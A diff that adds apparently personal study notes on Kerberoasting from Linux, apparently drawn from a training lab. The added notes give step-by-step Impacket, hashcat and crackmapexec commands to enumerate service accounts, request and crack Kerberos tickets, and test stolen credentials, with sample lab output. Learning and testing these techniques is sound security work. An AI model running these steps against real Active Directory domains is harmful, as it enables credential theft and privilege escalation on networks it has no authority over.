@@ -1316,3 +1316,114 @@ The **UserAccountControl (UAC)** attribute in Active Directory defines specific 
 ### **Combining UAC Values**
 - UAC values can combine to represent multiple properties. For example:
   - A disabled account (`2`) that does not require a password (`32`) would have a UAC value of `34` (`2 + 32`).
+
+# Kerberoasting from Linux:
+
+#### **Overview**
+Kerberoasting is a **lateral movement and privilege escalation technique** targeting Service Principal Names (SPNs) in Active Directory (AD). SPNs link services to service accounts, often requiring domain credentials for authentication. By requesting Kerberos service tickets (TGS-REPs), attackers can extract encrypted ticket data offline to attempt brute-force password cracking.
+
+---
+
+### **Core Concepts**
+1. **SPNs and Their Role in Kerberos**:
+   - SPNs uniquely identify a service instance running under a domain account.
+   - Service accounts often have elevated privileges (e.g., local or domain admin).
+
+2. **The Attack Workflow**:
+   - Any domain user can request a TGS ticket for any SPN.
+   - The TGS-REP ticket is encrypted with the service account’s NTLM hash.
+   - Offline cracking of the TGS-REP can reveal the cleartext password.
+
+3. **Common Weaknesses Exploited**:
+   - Weak or reused passwords on service accounts.
+   - Privileged service accounts with SPNs (e.g., SQL Server, SolarWinds).
+   - Misconfigured SPNs linked to domain or enterprise administrator accounts.
+
+4. **Potential Outcomes**:
+   - **High Impact**: Privileged accounts like `Domain Admins` compromised.
+   - **Low Impact**: Cracked passwords grant limited access but may help pivot within the domain.
+
+---
+
+### **Key Tools for Kerberoasting from Linux**
+1. **Impacket Toolkit**:
+   - Provides tools like `GetUserSPNs.py` to enumerate SPNs and request TGS tickets.
+   - Can be used with domain credentials or NTLM hashes.
+
+2. **Hashcat**:
+   - Crack TGS tickets offline using GPU-powered password recovery.
+
+3. **Additional Utilities**:
+   - `crackmapexec`: Validate cracked credentials.
+   - `rockyou.txt` or other password wordlists for brute-force attacks.
+
+---
+
+### **Steps for Performing Kerberoasting on Linux**
+
+#### **1. Install Impacket**
+```bash
+ sudo python3 -m pip install .
+```
+- Installs Impacket's tools in the system's PATH for easy access.
+
+---
+
+#### **2. Enumerate SPNs with Valid Credentials**
+Command:
+```bash
+ GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME>
+```
+
+Example Output:
+| ServicePrincipalName                          | Name             | MemberOf              | PasswordLastSet   |
+|-----------------------------------------------|------------------|-----------------------|-------------------|
+| `backupjob/veam001.inlanefreight.local`       | `BACKUPAGENT`    | `Domain Admins`       | `2022-02-15`      |
+| `sts/inlanefreight.local`                     | `SOLARWINDSMONITOR` | `Domain Admins`     | `2022-02-15`      |
+
+---
+
+#### **3. Request TGS Tickets**
+Command:
+```bash
+ GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME> -request
+```
+Output includes SPNs and encrypted TGS tickets (e.g., `$krb5tgs$23$...`).
+
+---
+
+#### **4. Save Tickets to a File for Cracking**
+Command:
+```bash
+ GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME> -request -outputfile <FILE>
+```
+
+---
+
+#### **5. Crack TGS Tickets with Hashcat**
+Command:
+```bash
+ hashcat -m 13100 <FILE> /usr/share/wordlists/rockyou.txt
+```
+
+Example Cracked Password:
+```plaintext
+$krb5tgs$23$...:database!
+```
+
+---
+
+#### **6. Test Access with Cracked Credentials**
+Command:
+```bash
+ sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWORD>
+```
+
+Example Output:
+```plaintext
+SMB         172.16.5.5      445    <DC_NAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD> (Pwn3d!)
+```
+
+---
+
+
